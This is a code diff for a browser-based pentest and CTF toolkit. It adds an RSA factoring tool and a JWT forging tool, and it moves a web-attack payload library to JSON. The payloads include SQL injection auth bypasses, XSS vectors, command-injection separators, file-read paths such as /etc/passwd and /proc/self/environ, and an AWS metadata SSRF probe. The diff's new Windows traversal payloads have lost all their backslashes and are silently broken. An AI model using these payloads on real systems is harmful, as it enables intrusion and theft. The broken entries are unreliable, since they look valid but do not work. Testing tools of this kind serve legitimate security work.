@@ -154,7 +154,7 @@
     },
     {
       "name": "Windows hosts",
-      "payload": "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
+      "payload": "......WindowsSystem32driversetchosts",
       "tags": "windows",
       "notes": "Backslashes for Windows paths."
     },
@@ -214,7 +214,7 @@
     },
     {
       "name": "Windows traversal in parameter",
-      "payload": "{TARGET}?{PARAM}=..\\..\\..\\Windows\\win.ini",
+      "payload": "{TARGET}?{PARAM}=......Windowswin.ini",
       "tags": "web,windows",
       "notes": "Common Windows file test."
     }
@@ -261,15 +261,14 @@
         const { useState } = React;
         const e = React.createElement;
         
-        // Payload library is stored as JSON (not inline JS) to prevent <\/script> parsing breaks.
-        // This makes the payload system future-proof even with large libraries.
+        // Payload library is stored as JSON (not inline JS) to prevent HTML parsing issues with payload content.
         function loadPayloadLibrary() {
             try {
                 const el = document.getElementById('payload-library-data');
                 if (!el) return {};
                 return JSON.parse(el.textContent || '{}');
-            } catch (e) {
-                console.error('Failed to load payload library JSON', e);
+            } catch (err) {
+                console.error('Failed to load payload library JSON', err);
                 return {};
             }
         }
@@ -542,8 +541,35 @@ const caesarCipher = (text, s, d = false) => { const sh = d ? (26 - (s % 26)) : 
             if (tool === 'rsa-toolkit') {
                 const gcd = (a, b) => b === 0 ? a : gcd(b, a % b);
                 const modInverse = (a, m) => { let [or, r] = [a, m]; let [os, s] = [1, 0]; while (r !== 0) { const q = Math.floor(or / r); [or, r] = [r, or - q * r]; [os, s] = [s, os - q * s]; } return os < 0 ? os + m : os; };
-                const factorN = () => { const mod = parseInt(rsaN); if (isNaN(mod) || mod < 4) { setOutput('Invalid'); return; } for (let i = 2; i <= Math.sqrt(mod); i++) { if (mod % i === 0) { setRsaP(i.toString()); setRsaQ((mod/i).toString()); setOutput(`p = $const library = loadPayloadLibrary();
-e(/"/g, '&quot;').replace(/'/g, '&#39;');
+                const factorN = () => { const mod = parseInt(rsaN); if (isNaN(mod) || mod < 4) { setOutput('Invalid'); return; } for (let i = 2; i <= Math.sqrt(mod); i++) { if (mod % i === 0) { setRsaP(i.toString()); setRsaQ((mod/i).toString()); setOutput(`p = ${i}\nq = ${mod/i}`); return; }} setOutput('Cannot factor'); };
+                const calcPrivate = () => { const pv = parseInt(rsaP), qv = parseInt(rsaQ), ev = parseInt(rsaE); if (isNaN(pv) || isNaN(qv) || isNaN(ev)) { setOutput('Invalid'); return; } const nc = pv * qv; const phi = (pv - 1) * (qv - 1); if (gcd(ev, phi) !== 1) { setOutput('e and φ(n) not coprime'); return; } const d = modInverse(ev, phi); setRsaN(nc.toString()); setOutput(`n = ${nc}\nφ(n) = ${phi}\nd = ${d}`); };
+                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'RSA Calculator'),
+                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('input', { type: 'text', value: rsaN, onChange: (ev) => setRsaN(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'n' }), e('input', { type: 'text', value: rsaE, onChange: (ev) => setRsaE(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'e' })),
+                    e('button', { onClick: factorN, className: 'w-full px-4 py-3 bg-[#ff00ff]/20 border border-[#ff00ff] rounded text-[#ff00ff] font-bold' }, 'FACTOR n'),
+                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('input', { type: 'text', value: rsaP, onChange: (ev) => setRsaP(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'p' }), e('input', { type: 'text', value: rsaQ, onChange: (ev) => setRsaQ(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'q' })),
+                    e('button', { onClick: calcPrivate, className: 'w-full px-4 py-3 bg-[#00d9ff]/20 border border-[#00d9ff] rounded text-[#00d9ff] font-bold' }, 'CALC PRIVATE KEY'),
+                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
+                );
+            }
+
+            // JWT TOOLKIT
+            if (tool === 'jwt-toolkit') {
+                const decodeJWT = () => { try { const parts = input.split('.'); if (parts.length !== 3) { setOutput('Invalid JWT'); return; } const h = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/'))); const p = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'))); setJwtHeader(JSON.stringify(h, null, 2)); setJwtPayload(JSON.stringify(p, null, 2)); setJwtSig(parts[2]); setOutput('Decoded'); } catch(e) { setOutput('Error: ' + e.message); }};
+                const forgeJWT = () => { try { const h = JSON.parse(jwtHeader); const p = JSON.parse(jwtPayload); const b64url = (s) => btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, ''); const nh = b64url(JSON.stringify(h)); const np = b64url(JSON.stringify(p)); setOutput(`${nh}.${np}.${jwtSig}`); } catch(e) { setOutput('Error'); }};
+                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'JWT Swiss Army Knife'),
+                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-20 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none', placeholder: 'Paste JWT...' }),
+                    e('button', { onClick: decodeJWT, className: 'w-full px-4 py-3 bg-[#00d9ff]/20 border border-[#00d9ff] rounded text-[#00d9ff] font-bold' }, e(icons.Key, { className: 'w-4 h-4 inline mr-2' }), 'DECODE'),
+                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('textarea', { value: jwtHeader, onChange: (ev) => setJwtHeader(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-xs font-mono focus:border-[#00ff41] focus:outline-none resize-none', placeholder: 'Header' }), e('textarea', { value: jwtPayload, onChange: (ev) => setJwtPayload(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-xs font-mono focus:border-[#00ff41] focus:outline-none resize-none', placeholder: 'Payload' })),
+                    e('input', { type: 'text', value: jwtSig, onChange: (ev) => setJwtSig(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'Signature' }),
+                    e('button', { onClick: forgeJWT, className: 'w-full px-4 py-3 bg-[#ff00ff]/20 border border-[#ff00ff] rounded text-[#ff00ff] font-bold' }, 'FORGE'),
+                    e('textarea', { value: output, readOnly: true, className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
+                );
+            }
+
+            // PAYLOAD GENERATOR
+if (tool === 'payload-gen') {
+    // NOTE: This library is intended for authorized testing / CTF use. Avoid using against systems you don't own or have permission to test.
+    const encodeHtml = (s) => (s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
     const base64Encode = (s) => {
         try {
             const bytes = new TextEncoder().encode(s ?? '');
@@ -566,59 +592,8 @@ e(/"/g, '&quot;').replace(/'/g, '&#39;');
         .replace(/\{PORT\}/g, payloadPort)
         .replace(/\{DOMAIN\}/g, domain);
 
-    const library = {
-        sqli: [
-            { name: "Boolean auth bypass (single-quote)", payload: "' OR '1'='1' -- -", tags: "auth,boolean", notes: "Classic boolean-based bypass. May need adaptation to backend/quoting." },
-            { name: "Boolean auth bypass (double-quote)", payload: "\" OR \"1\"=\"1\" -- -", tags: "auth,boolean", notes: "Useful when input is wrapped in double quotes." },
-            { name: "Comment truncation", payload: "admin'-- -", tags: "auth,comment", notes: "Tries to comment out the rest of a query after username." },
-            { name: "UNION basic (3 cols, NULLs)", payload: "' UNION SELECT NULL,NULL,NULL -- -", tags: "union", notes: "Adjust NULL count to match column count." },
-            { name: "Time delay (MySQL)", payload: "' OR SLEEP(3) -- -", tags: "time", notes: "Simple time-based test (MySQL/MariaDB)." },
-            { name: "Time delay (PostgreSQL)", payload: "'; SELECT pg_sleep(3) --", tags: "time", notes: "Time-based test (PostgreSQL)." },
-            { name: "Order by probe", payload: "' ORDER BY 1 -- -", tags: "recon", notes: "Increment ORDER BY to infer column count." },
-            { name: "Error-based probe", payload: "' AND 1=CONVERT(int,(SELECT @@version)) --", tags: "error", notes: "May trigger visible errors (SQL Server)." }
-        ],
-        xss: [
-            { name: "Simple script tag", payload: "<script>alert(1)<\/script>", tags: "reflected", notes: "Works on permissive contexts. Escaped <\/script> is required inside script blocks." },
-            { name: "IMG onerror", payload: "<img src=x onerror=alert(1)>", tags: "reflected", notes: "Often works when <script> is filtered but attributes pass." },
-            { name: "SVG onload", payload: "<svg onload=alert(1)></svg>", tags: "reflected", notes: "Common alternative vector." },
-            { name: "Attribute break-out (double quote)", payload: "\"><img src=x onerror=alert(1)>", tags: "attr", notes: "Use when injection occurs inside an HTML attribute quoted with \". " },
-            { name: "HTML event handler", payload: "<button onclick=alert(1)>click</button>", tags: "dom", notes: "Basic event-handler test." }
-        ],
-        cmdi: [
-            { name: "Command chain (;) + whoami", payload: "; {CMD}", tags: "unix", notes: "Semicolon command chaining; replace {CMD}." },
-            { name: "Command chain (&&)", payload: "&& {CMD}", tags: "unix", notes: "Runs second command only if first succeeds." },
-            { name: "Pipe into command (|)", payload: "| {CMD}", tags: "unix", notes: "Pipes output to command; sometimes useful for bypassing." },
-            { name: "Windows chain (&)", payload: "& {CMD}", tags: "windows", notes: "Windows command separator." },
-            { name: "Windows chain (&&)", payload: "&& {CMD}", tags: "windows", notes: "Windows conditional chain." }
-        ],
-        lfi: [
-            { name: "Linux passwd", payload: "../../../../../etc/passwd", tags: "linux", notes: "Depth may vary; try adding/removing ../ segments." },
-            { name: "Linux proc self environ", payload: "../../../../../proc/self/environ", tags: "linux,proc", notes: "Sometimes reveals env vars / secrets." },
-            { name: "Windows hosts", payload: "..\..\..\Windows\System32\drivers\etc\hosts", tags: "windows", notes: "Backslashes for Windows paths." },
-            { name: "Traversal with URL-encoding (../)", payload: "..%2f..%2f..%2fetc%2fpasswd", tags: "encoding", notes: "Use when raw ../ is filtered." }
-        ],
-        ssti: [
-            { name: "Jinja2 basic expression", payload: "{{7*7}}", tags: "jinja2", notes: "If you see 49 rendered, template injection is likely." },
-            { name: "Handlebars basic", payload: "{{this}}", tags: "handlebars", notes: "Framework detection helper." },
-            { name: "ERB basic", payload: "<%= 7*7 %>", tags: "erb", notes: "Ruby ERB test." }
-        ],
-        ssrf: [
-            { name: "Localhost probe", payload: "http://127.0.0.1/", tags: "internal", notes: "Checks if server can reach localhost." },
-            { name: "Metadata (AWS)", payload: "http://169.254.169.254/latest/meta-data/", tags: "cloud", notes: "Cloud metadata endpoint probe (AWS). Use responsibly." },
-            { name: "Targeted internal host", payload: "http://{IP}:{PORT}/", tags: "internal", notes: "Use placeholders for internal IP/port." }
-        ],
-        traversal: [
-            { name: "Path traversal in parameter", payload: "{TARGET}?{PARAM}=../../../../etc/passwd", tags: "web", notes: "Template shows how traversal looks when used in a URL param." },
-            { name: "Windows traversal in parameter", payload: "{TARGET}?{PARAM}=..\..\..\Windows\win.ini", tags: "web,windows", notes: "Common Windows file test." }
-        ],
-        redirect: [
-            { name: "Open redirect (basic)", payload: "{TARGET}?next=https://{DOMAIN}/", tags: "web", notes: "Adjust parameter name to match app (next/url/redirect/return)." },
-            { name: "Protocol-relative redirect", payload: "{TARGET}?next=//{DOMAIN}/", tags: "web", notes: "Sometimes bypasses filters that block http(s)://." }
-        ],
-        jwt: [
-            { name: "Header/payload placeholder", payload: "HEADER.{PAYLOAD}.SIGNATURE", tags: "tokens", notes: "Use JWT tool to decode/edit/encode. Placeholder entry for workflows." }
-        ]
-    };
+    const library = loadPayloadLibrary();
+
 
     const types = Object.keys(library);
     const q = payloadQuery.trim().toLowerCase();
